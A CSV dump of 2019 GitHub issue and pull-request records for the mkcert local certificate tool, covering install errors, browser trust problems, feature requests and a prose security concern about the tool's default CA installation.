FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/175,465205118,MDU6SXNzdWU0NjUyMDUxMTg=,175,Can we customize the Certificate Attributes of CA while generating CA with mkcert ,4878990,closed,FALSE,NA,NA,3,2019-07-08T11:31:48Z,2020-01-08T06:24:40Z,2019-07-09T18:09:51Z,NONE,NA,"Hi All, 

It would be great if someone tells me how to customize the Certificate Attributes while generating CA with mkcert. Please let me know the feature is already available, if yes, how to modify CN, OU, O, issued by, etc. 
   
 Thanks a lot,",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/175/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/175/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/175/events,https://github.com/FiloSottile/mkcert/issues/175,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/174,464868153,MDU6SXNzdWU0NjQ4NjgxNTM=,174,"""Certificate not standards compliant"" on macOS Catalina, iOS 13",2541728,closed,FALSE,NA,NA,26,2019-07-06T16:12:47Z,2020-06-05T16:02:16Z,2019-08-16T21:30:01Z,NONE,NA,"**Certificates generated after July 1st, 2019 by versions of mkcert prior to v1.4.0 will not work on macOS 10.15 Catalina and iOS 13.** Please update mkcert and regenerate the affected certificates.

The root CA is unaffected and there is no need to rerun `mkcert -install`.

— @FiloSottile 

---

Under MacOS Catalina Public Beta 2, after installing mkcert via Homebrew and running the root certificate installer, my mkcert generated certificates are rejected in Safari with the message 'Certificate is not standards compliant' and in Chrome with 'ERR_CERT_REVOKED'.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/174/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/174/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/174/events,https://github.com/FiloSottile/mkcert/issues/174,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/173,464861255,MDU6SXNzdWU0NjQ4NjEyNTU=,173,Is there any metric that can help increase trust in mkcert,32358483,closed,FALSE,NA,NA,1,2019-07-06T14:50:42Z,2019-07-06T15:03:08Z,2019-07-06T15:03:08Z,NONE,NA,"While I appreciate that this project is open source, I think it'd be useful if there was some sort of certification from a large vendor such as Mozilla. This would make pitching it's adoption for local dev environments at work a whole lot easier.

Is there anything out there already or any plans to try get a vendor to vouch?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/173/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/173/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/173/events,https://github.com/FiloSottile/mkcert/issues/173,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/171,464458673,MDExOlB1bGxSZXF1ZXN0Mjk0NzMyMjI4,171,Add staticcheck to CI,1225294,closed,FALSE,NA,NA,0,2019-07-05T04:41:04Z,2019-07-05T04:41:39Z,2019-07-05T04:41:24Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/171/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/171/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/171/events,https://github.com/FiloSottile/mkcert/pull/171,https://api.github.com/repos/FiloSottile/mkcert/pulls/171
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/170,464332258,MDU6SXNzdWU0NjQzMzIyNTg=,170,can't load package: package github.com/FiloSottile/mkcert,10137,closed,FALSE,NA,NA,1,2019-07-04T15:59:54Z,2019-07-04T20:29:58Z,2019-07-04T20:29:58Z,NONE,NA,":~/mkcert-1.0.0$ sudo make
GOPATH=""/.GOPATH"" go install -v github.com/FiloSottile/mkcert
can't load package: package github.com/FiloSottile/mkcert: cannot find package ""github.com/FiloSottile/mkcert"" in any of:
	/usr/lib/go-1.10/src/github.com/FiloSottile/mkcert (from $GOROOT)
	/.GOPATH/src/github.com/FiloSottile/mkcert (from $GOPATH)
Makefile:5: recipe for target 'mkcert' failed
make: *** [mkcert] Error 1
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/170/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/170/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/170/events,https://github.com/FiloSottile/mkcert/issues/170,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/169,460057516,MDU6SXNzdWU0NjAwNTc1MTY=,169,Build release Linux binaries without cgo for Alpine compatibility?,217842,closed,FALSE,NA,NA,13,2019-06-24T19:30:07Z,2021-01-11T11:10:59Z,2019-07-05T04:28:48Z,NONE,NA,"I have a simple Dockerfile that uses the binary from GitHub.

**[Dockerfile](https://gitlab.com/anthonymastrean/mkcert-example/blob/master/Dockerfile)**
```dockerfile
FROM alpine

WORKDIR /root

RUN set -ex \
    && wget -q -O mkcert https://github.com/FiloSottile/mkcert/releases/download/v1.3.0/mkcert-v1.3.0-linux-arm \
    && chmod +x mkcert \
    && ./mkcert -install \
    && ./mkcert localhost
```

When I build this locally, everything is OK.

```
$ docker image build --pull --tag example .
Sending build context to Docker daemon  75.26kB
Step 1/3 : FROM alpine
latest: Pulling from library/alpine
Digest: sha256:ca1c944a4f8486a153024d9965aafbe24f5723c1d5c02f4964c045a16d19dc54
Status: Image is up to date for alpine:latest
 ---> 4d90542f0623
Step 2/3 : WORKDIR /root
 ---> Using cache
 ---> f1df3106650a
Step 3/3 : RUN set -ex     && wget -q -O mkcert https://github.com/FiloSottile/mkcert/releases/download/v1.3.0/mkcert-v1.3.0-linux-arm     && chmod +x mkcert     && ./mkcert -install     && ./mkcert localhost
 ---> Running in 7dce34e8bf2a
+ wget -q -O mkcert https://github.com/FiloSottile/mkcert/releases/download/v1.3.0/mkcert-v1.3.0-linux-arm
+ chmod +x mkcert
+ ./mkcert -install
Created a new local CA at ""/root/.local/share/mkcert"" �
Installing to the system store is not yet supported on this Linux � but Firefox and/or Chrome/Chromium will still work.
You can also manually install the root certificate at ""/root/.local/share/mkcert/rootCA.pem"".

+ ./mkcert localhost
Using the local CA at ""/root/.local/share/mkcert"" ✨
Warning: the local CA is not installed in the system trust store! ⚠️
Run ""mkcert -install"" to avoid verification errors ‼️

Created a new certificate valid for the following names �
 - ""localhost""

The certificate is at ""./localhost.pem"" and the key at ""./localhost-key.pem"" ✅

Removing intermediate container 7dce34e8bf2a
 ---> 8f5c4f5e7940
Successfully built 8f5c4f5e7940
Successfully tagged example:latest
```

But, when I run the same in a GitLab pipeline (uses Docker-in-Docker), it goes haywire!

**[.gitlab-ci.yml](https://gitlab.com/anthonymastrean/mkcert-example/blob/master/.gitlab-ci.yml)**
```yml
image: docker:stable

services:
    - docker:stable-dind

build:
    stage: build
    script:
        - docker image build --pull --tag example .
```

**[Pipeline log](https://gitlab.com/anthonymastrean/mkcert-example/-/jobs/239053212)**
```
Running with gitlab-runner 12.0.0-rc1 (58d8360f)
  on docker-auto-scale 0277ea0f
Using Docker executor with image docker:stable ...
Starting service docker:stable-dind ...
Pulling docker image docker:stable-dind ...
Using docker image sha256:12adad4e12e25288e665131d5235d98a8edf2a39d26679dabbe2728442729e26 for docker:stable-dind ...
Waiting for services to be up and running...
Pulling docker image docker:stable ...
Using docker image sha256:805bea199b249bfed61cdcd7cdbfe240ee998d51f59bbf365674a15b619f5a86 for docker:stable ...
Running on runner-0277ea0f-project-13015620-concurrent-0 via runner-0277ea0f-srm-1561404020-8e640368...
Fetching changes with git depth set to 50...
Initialized empty Git repository in /builds/anthonymastrean/mkcert-example/.git/
Created fresh repository.
From https://gitlab.com/anthonymastrean/mkcert-example
 * [new branch]      master     -> origin/master
Checking out 61c5932f as master...

Skipping Git submodules setup
$ docker image build --pull --tag example .
Sending build context to Docker daemon  47.62kB

Step 1/3 : FROM alpine
latest: Pulling from library/alpine
921b31ab772b: Pulling fs layer
921b31ab772b: Verifying Checksum
921b31ab772b: Download complete
921b31ab772b: Pull complete
Digest: sha256:ca1c944a4f8486a153024d9965aafbe24f5723c1d5c02f4964c045a16d19dc54
Status: Downloaded newer image for alpine:latest
 ---> 4d90542f0623
Step 2/3 : WORKDIR /root
 ---> Running in 104eadb1c574
Removing intermediate container 104eadb1c574
 ---> 4de722b6deac
Step 3/3 : RUN set -ex     && wget -q -O mkcert https://github.com/FiloSottile/mkcert/releases/download/v1.3.0/mkcert-v1.3.0-linux-arm     && chmod +x mkcert     && ./mkcert -install     && ./mkcert localhost
 ---> Running in 6c027ecfa62a
+ wget -q -O mkcert https://github.com/FiloSottile/mkcert/releases/download/v1.3.0/mkcert-v1.3.0-linux-arm
+ chmod +x mkcert
+ ./mkcert -install
/bin/sh: ./mkcert: not found
The command '/bin/sh -c set -ex     && wget -q -O mkcert https://github.com/FiloSottile/mkcert/releases/download/v1.3.0/mkcert-v1.3.0-linux-arm     && chmod +x mkcert     && ./mkcert -install     && ./mkcert localhost' returned a non-zero code: 127
ERROR: Job failed: exit code 127
```

Does anyone have any ideas?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/169/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/169/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/169/events,https://github.com/FiloSottile/mkcert/issues/169,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/168,455177056,MDExOlB1bGxSZXF1ZXN0Mjg3NDc4MTQ3,168,README: use $GOBIN instead of $GOPATH/bin,3576549,closed,FALSE,NA,NA,3,2019-06-12T12:11:31Z,2019-06-20T06:55:45Z,2019-06-12T17:24:11Z,CONTRIBUTOR,NA,"$GOPATH/bin works in the simple cases, but will break if the user
specifies their own $GOBIN, or if their $GOPATH has multiple elements.

This form is also simpler. Even if the user doesn't specify their custom
$GOBIN, 'go env GOBIN' will return the correct default.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/168/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/168/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/168/events,https://github.com/FiloSottile/mkcert/pull/168,https://api.github.com/repos/FiloSottile/mkcert/pulls/168
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/167,453920036,MDU6SXNzdWU0NTM5MjAwMzY=,167,LetsEncrypt,11575008,closed,FALSE,NA,NA,0,2019-06-09T17:31:14Z,2019-06-09T18:54:05Z,2019-06-09T18:54:05Z,NONE,NA,"Hi, is it possible to generate the privKey.pem and fullchain.pem as LetsEncrypt does?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/167/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/167/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/167/events,https://github.com/FiloSottile/mkcert/issues/167,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/166,449096206,MDExOlB1bGxSZXF1ZXN0MjgyNjkyOTQ1,166,Add support for certificates with client and server auth and URL SANs,1163662,closed,FALSE,NA,NA,5,2019-05-28T07:02:30Z,2019-07-05T04:16:20Z,2019-07-05T04:16:20Z,CONTRIBUTOR,NA,"Thank you for this awesome tool! :-)

I wanted to use it to create certificates for a Service Mesh, that is for using Istio with mTLS without using Citadel.
Therefore I needed to create certificates that have an extended key usage of client and server auth.
I also needed to have Spiffe URIs in the Subject Alternate Names.

Therefore I did the following changes:
1. Add a new flag `-server` which is enabled by default. If set to `false` and setting `-client=true` a client-only certificate would be generated, with `-client=true`  and `-server=true` (the default) a client and server certificate would be created.
2. Check the hostnames for being a URI with a non-empty scheme. In that case the name is accepted and added as a URI SAN.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/166/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/166/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/166/events,https://github.com/FiloSottile/mkcert/pull/166,https://api.github.com/repos/FiloSottile/mkcert/pulls/166
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/165,448562483,MDU6SXNzdWU0NDg1NjI0ODM=,165,WordPress health check error: curl: (60) SSL certificate problem: unable to get local issuer certificate,14124095,closed,FALSE,NA,NA,13,2019-05-26T12:33:51Z,2020-10-16T19:05:47Z,2019-06-01T12:30:24Z,NONE,NA,"It this a known issue with macOS Mojave (10.14.5)? I have problems with site health check in WordPress 5.2.1 and REST API and loopback requests.

```
curl https://local.website.com
curl: (60) SSL certificate problem: unable to get local issuer certificate
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/165/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/165/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/165/events,https://github.com/FiloSottile/mkcert/issues/165,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/164,448350247,MDU6SXNzdWU0NDgzNTAyNDc=,164,"After mkcert I get ""Potential Security Risk"" warning",5446768,closed,FALSE,NA,NA,3,2019-05-24T20:55:30Z,2019-06-01T12:33:15Z,2019-06-01T12:33:15Z,NONE,NA,"I installed mkcert in ArchLinux.
Installation was smooth. No issues, no warnings.
I run 

> mkcert -install and mkcert localhost.

 Everything was fine and I was ""told"" by the installer that Firefox and Chrome/Chromium had been included.

I then run in my dev environment:

>  npx vue-cli-service serve --https --port 8040

The server started on https://localhost:8040 but ... when I go to the page I get warnings of not being secure. 
Also while testing a mailchip api the browser rejects the connection due to CORS given that my connection is not secure.
Could you help me fix these problems.
Thanks!!",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/164/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/164/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/164/events,https://github.com/FiloSottile/mkcert/issues/164,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/163,448298960,MDU6SXNzdWU0NDgyOTg5NjA=,163,Install CA certificate from a remote mkcert,1165758,closed,FALSE,NA,NA,2,2019-05-24T18:24:02Z,2019-06-01T12:35:32Z,2019-06-01T12:35:32Z,NONE,NA,"I'm running a windows host with mkcert installed on a Linux VM, but there's no easy way to install the mkcert root CA inside Windows host.

from windows Host, I would like to run `mkcert -install -url https://192.168.1.100:9999/ca.pem`.

The `ca.pem` could be published on the Vagrant VM side with `mkcert -serve-ca 9999`.

Would you accept a pull request for this feature ?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/163/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/163/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/163/events,https://github.com/FiloSottile/mkcert/issues/163,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/162,447078024,MDExOlB1bGxSZXF1ZXN0MjgxMTQ3NDky,162,Support SLES & OpenSUSE,10237751,closed,FALSE,NA,NA,5,2019-05-22T11:19:42Z,2019-06-01T13:05:14Z,2019-06-01T13:05:09Z,CONTRIBUTOR,NA,Add support for SLES & OpenSUSE.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/162/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/162/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/162/events,https://github.com/FiloSottile/mkcert/pull/162,https://api.github.com/repos/FiloSottile/mkcert/pulls/162
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/161,445585771,MDU6SXNzdWU0NDU1ODU3NzE=,161,Chrome 58+: NET::ERR_CERT_COMMON_NAME_INVALID when using generated cert,206973,closed,FALSE,NA,NA,1,2019-05-17T19:29:29Z,2019-06-01T12:37:45Z,2019-06-01T12:37:45Z,NONE,NA,"**Browser:** Google Chrome 74.0.3729.157 (Official Build) (64-bit) (cohort: Stable)
**OS:** Windows 10 OS Build 17134.765

[Looks like an issue which begun with Chrome 58](https://support.google.com/chrome/a/answer/7391219?hl=en). Is there a recommended workaround that still make use of `mkcert`'s wonderful simple UX? :)

# Repro Steps

Make and install cert: 

1. Open Command Prompt as Administrator
1. `choco install mkcert`
1. `mkcert -install`
1. Select ""Yes"" when prompted about installing

Run web server and visit webpage: 

1. `cross-env NODE_ENV=development webpack-dev-server -d --hot --config webpack.config.js --watch --https --cert=C:\Users\myuser\AppData\Local\mkcert\rootCA.pem --key=C:\Users\myuser\AppData\Local\mkcert\rootCA-key.pem`
1. Open https://localhost:8080

Expected: page loads OK with green lock
Actual: `NET::ERR_CERT_COMMON_NAME_INVALID` error (see below)

![image](https://user-images.githubusercontent.com/206973/57951532-51035800-78b8-11e9-90ac-6b2f05b5c9f1.png)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/161/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/161/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/161/events,https://github.com/FiloSottile/mkcert/issues/161,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/159,436707340,MDU6SXNzdWU0MzY3MDczNDA=,159,"CA installation in Windows git-bash (curl there, etc)",112444,open,FALSE,NA,NA,7,2019-04-24T13:46:26Z,2020-12-09T21:00:25Z,NA,NONE,NA,"It would be wonderful if in addition to all the wonderful places the CA is already installed it could be installed in the git-bash ecosystem (for curl in windows git bash).

Thanks for mkcert! it's is an amazing breakthrough. I'm integrating it into [ddev](https://github.com/drud/ddev) a local web development environment which runs on most platforms. And it's now able to trust local certs for the very first time. Thanks!
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/159/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/159/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/159/events,https://github.com/FiloSottile/mkcert/issues/159,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/158,433898174,MDU6SXNzdWU0MzM4OTgxNzQ=,158,Trouble on install on linux,34646726,closed,FALSE,NA,NA,5,2019-04-16T17:23:57Z,2021-01-31T22:18:54Z,2019-06-01T12:40:43Z,NONE,NA,"i want to install mkcert from brew, & show error :

> pi@raspberrypi:~ $ brew install mkcert
Updating Homebrew...
==> Installing dependencies for mkcert: go
==> Installing mkcert dependency: go
==> Downloading https://dl.google.com/go/go1.12.3.src.tar.gz
Already downloaded: /home/pi/.cache/Homebrew/downloads/db77615ab69139f8c1ce0273b27aacd84f7e09074312136f82aaa7b0dbb37d3d--go1.12.3.src.tar.gz
==> Downloading https://storage.googleapis.com/golang/go1.7.linux-amd64.tar.gz
Already downloaded: /home/pi/.cache/Homebrew/downloads/04b57725e4f47b10e87a6a8bd5e2ff1fcf5b3d0528c8c380be25ace54607c9e2--go1.7.linux-amd64.tar.gz
==> ./make.bash --no-clean
Last 15 lines from /home/pi/.cache/Homebrew/Logs/go/01.make.bash:
2019-04-16 16:04:00 +0000
./make.bash
--no-clean
Building Go cmd/dist using /tmp/go-20190416-26205-gq88p6/go/gobootstrap.
./make.bash: line 167: /tmp/go-20190416-26205-gq88p6/go/gobootstrap/bin/go: cannot execute binary file: Exec format error
READ THIS: https://docs.brew.sh/Troubleshooting

How to solve this?

",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/158/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/158/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/158/events,https://github.com/FiloSottile/mkcert/issues/158,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/157,433809759,MDU6SXNzdWU0MzM4MDk3NTk=,157,"mac work fine but ""password"" always request on client certificates",30625765,closed,FALSE,NA,NA,2,2019-04-16T14:24:24Z,2019-04-16T18:55:49Z,2019-04-16T18:55:49Z,NONE,NA,"Hello, 

Thanks for that amazing too. Everything is working smoothly, except that when I connect to the website using chrome, after I select the client certificate I always get this popup asking for my password. Is there a way to get ride of it ? 

I followed the instruction : 

`mkcert -install`
then `mkcert ""*.exemple.com"" example.com localhost 127.0.0.1`
followed by  `mkcert -client -pkcs12 ""*.example.com"" example.com locahost 127.0.0.1`

I use the `export` variable also for node. 

![image](https://user-images.githubusercontent.com/30625765/56216848-76efcf80-6062-11e9-8e2b-5379db85bd63.png)

It happens only from a new window, maybe it's required by chrome to access the keystore ? 

Thanks.

",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/157/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/157/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/157/events,https://github.com/FiloSottile/mkcert/issues/157,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/156,433395275,MDU6SXNzdWU0MzMzOTUyNzU=,156,Unsafe defaults facilitate privilege escalation,898409,closed,FALSE,NA,NA,2,2019-04-15T17:23:57Z,2019-04-16T07:58:09Z,2019-04-15T17:32:33Z,NONE,NA,"The only safe way to use a local CA on a typical system is to install its certificate in a separate browser profile, which is then used for development only. Otherwise, the following scenario can use the CA as part of an exploit chain:
1. Gain remote read access to the file system.
2. Read the CA private key from one of the standard (= easy to find) locations.
3. Impersonate e.g. GitHub and replace downloaded binaries with your own.
4. The user downloads and runs a binary (latest pre-built `mkcert`?)
5. Remote code execution achieved.

By using a separate browser profile, all that a compromised CA key can achieve is to impersonate the page/app under development.

The default behavior for `mkcert -install` is to enable step 3 of the above exploit chain. And what's worse, the only way to make it secure is to abuse the environment variable `$TRUST_STORES` by providing an invalid value, so that the generated certs are not installed anywhere. One must then use `-CAROOT` to actually find the generated root certs (this one is at least documented).

This is the exact opposite of the ""safe by default"" policy that any software should follow, much less any software designed to help people make their own software more secure.

As a solution to this problem, you could provide a command which just generates the CA certificates (optionally in a specified directory) and mention it as the safe alternative to `-install` in all documentation. IMHO it's not necessary to completely replace `-install` since e.g. a dedicated development system, where the user is not installing random software from the internet, is still a perfectly valid use case for it.

As a bonus, please explicitly document a value for `$TRUST_STORES` which is guaranteed to not match any future store types, e.g. ""`none`"".",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/156/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/156/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/156/events,https://github.com/FiloSottile/mkcert/issues/156,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/155,432802410,MDU6SXNzdWU0MzI4MDI0MTA=,155,Clarify that mkcert and be used as an infrastructure CA,4702068,open,FALSE,NA,NA,2,2019-04-13T03:29:14Z,2020-08-16T06:58:34Z,NA,NONE,NA,"Filippo, as we discussed as GothamGo, using `mkcert` as an infrastructure CA to secure internal service-to-service http calls is probably a use case falls within the mission of `mkcert`. The readme provides enough detail on how to do this manually, but it warns against ""production"" use. Please clarify that this use case is not discouraged. Thanks.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/155/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/155/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/155/events,https://github.com/FiloSottile/mkcert/issues/155,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/154,432801937,MDU6SXNzdWU0MzI4MDE5Mzc=,154,ACME server,4702068,open,FALSE,NA,NA,8,2019-04-13T03:22:31Z,2020-10-25T23:35:30Z,NA,NONE,NA,I would like to use `mkcert` as an ACME server to automate the process of using it as an internal CA for securing service-to-service http calls. Maybe as a separate program (`mkcert-ca`?),NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/154/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/154/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/154/events,https://github.com/FiloSottile/mkcert/issues/154,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/153,431870724,MDU6SXNzdWU0MzE4NzA3MjQ=,153,Virus scanner detects windows release as infected,319268,closed,FALSE,NA,NA,2,2019-04-11T07:28:15Z,2019-09-02T07:52:01Z,2019-04-11T16:46:08Z,NONE,NA,"It's a false positive for sure, but this can be quite an issue with company networks where users are not allowed to configure exceptions for the virus scanner.

Virustotal.com shows no match for Bitdefender (only for McAffee), but on a colleague's windows system Bitdefender detects the exe as virus as well.

Is there anything you can do to prevent that false positive? 

Tested with that release: https://github.com/FiloSottile/mkcert/releases/download/v1.3.0/mkcert-v1.3.0-windows-amd64.exe

Scan result:

> McAfee-GW-Edition
> BehavesLike.Win64.VirRansom.rh

https://www.virustotal.com/gui/file/546ad2acbf74ddad79e47d2fe86fe851aa25012822fec7c656b565dbb82a23ed/detection

![Bildschirmfoto von 2019-04-11 09-18-50](https://user-images.githubusercontent.com/319268/55938115-db61f780-5c3a-11e9-9567-a2a928a7e23e.png)
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/153/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/153/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/153/events,https://github.com/FiloSottile/mkcert/issues/153,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/152,431193576,MDExOlB1bGxSZXF1ZXN0MjY4OTIyODEw,152,Allow email SANs for S/MIME certificates,1144197,closed,FALSE,NA,NA,4,2019-04-09T20:58:16Z,2019-04-12T02:59:53Z,2019-04-12T02:59:44Z,CONTRIBUTOR,NA,"This PR allows email addresses to be passed in, along with IP addresses and domain names. Email addresses are added as SANs. The appropriate EKUs are added to the cert based on which types of SANs are present. To identify email addresses, I try parsing them with the `net/mail` package. This is probably overkill and I'm happy to switch to a regex if that's preferrable.



/fixes https://github.com/FiloSottile/mkcert/issues/143
/cc @jcjones",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/152/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/152/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/152/events,https://github.com/FiloSottile/mkcert/pull/152,https://api.github.com/repos/FiloSottile/mkcert/pulls/152
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/151,421987602,MDU6SXNzdWU0MjE5ODc2MDI=,151,-client certificate error while adding to OSX Keychain Acess,19648988,closed,FALSE,NA,NA,1,2019-03-17T23:30:00Z,2019-03-18T08:06:59Z,2019-03-18T08:06:59Z,NONE,NA,"I could set up everything except the client certificate. 

When I try to add it to the Keychain APP in OSX i get the error:

An error has occurred. Unable to import an item.
The contents of this item cannot be retrieved.

I want to use client authentication so that only clients with the certificate installed are allowed to access my Webserver. The Webserver is hosted by nginx.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/151/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/151/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/151/events,https://github.com/FiloSottile/mkcert/issues/151,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/150,421381675,MDU6SXNzdWU0MjEzODE2NzU=,150,certutil: could not authenticate to token NSS Certificate DB.: SEC_ERROR_IO: An I/O error occurred during security authorization.,32534370,open,FALSE,NA,NA,3,2019-03-15T07:08:43Z,2020-06-30T09:15:59Z,NA,NONE,NA,"I tried looking an old issue #12, but it doesn't seem to help

Commands I have executed:
`sudo chmod u+x ./mkcert`,
and tried this also later
`sudo chmod 0777 ./mkcert`,
then
`sudo ./mkcert -install`
I have libnss3-tools version `2:3.28.4-0ubuntu0.16.04.5` installed which seems the latest for Ubuntu 16.04 LTS
```
Using the local CA at ""/home/user/.local/share/mkcert"" ✨
ERROR: failed to execute ""certutil -A"": exit status 255

certutil: could not authenticate to token NSS Certificate DB.: SEC_ERROR_IO: An I/O error occurred during security authorization.
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/150/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/150/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/150/events,https://github.com/FiloSottile/mkcert/issues/150,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/149,421269646,MDU6SXNzdWU0MjEyNjk2NDY=,149,Windows: the issuer of this certificate could not be found,177641,open,FALSE,NA,NA,2,2019-03-14T22:16:27Z,2020-12-08T16:20:47Z,NA,NONE,NA,"This comes up when you open the certificate mkcert has generated for you. Under the tab ""Certification Path"" under ""Certificate Status"".

I've already run `mkcert -install` in Windows Powershell so the issuer itself should be trusted and known.

Also Edge says certificate is invalid when I use it for local development hmmm.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/149/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/149/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/149/events,https://github.com/FiloSottile/mkcert/issues/149,NA
